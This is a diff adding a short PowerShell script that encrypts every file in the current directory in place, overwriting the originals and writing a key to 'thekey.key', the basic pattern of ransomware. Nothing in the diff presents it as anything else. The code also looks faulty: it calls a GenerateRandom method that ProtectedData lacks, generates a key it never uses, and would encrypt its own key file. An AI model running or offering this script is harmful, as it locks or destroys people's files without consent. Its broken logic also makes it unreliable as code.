@@ -1,1 +1,21 @@
+$files = Get-ChildItem
+
+$filesToEncrypt = $files | Where-Object { $_.Name -ne "your file here" -and !$_.PSIsContainer }
+
+$filesToEncrypt | ForEach-Object {
+    $file = $_
+    $key = [System.Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::GenerateRandom(32))
+    $keyFilePath = "thekey.key"
+    $encryptedFilePath = $file.Name
+
+    # Write the encryption key to the key file
+    Set-Content -Path $keyFilePath -Value $key -Encoding Byte
+
+    # Read and encrypt the file contents
+    $content = Get-Content -Path $file.FullName -Encoding Byte
+    $encryptedContent = [System.Security.Cryptography.ProtectedData]::Protect($content, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+
+    # Write the encrypted contents back to the file
+    Set-Content -Path $encryptedFilePath -Value $encryptedContent -Encoding Byte
+}
 
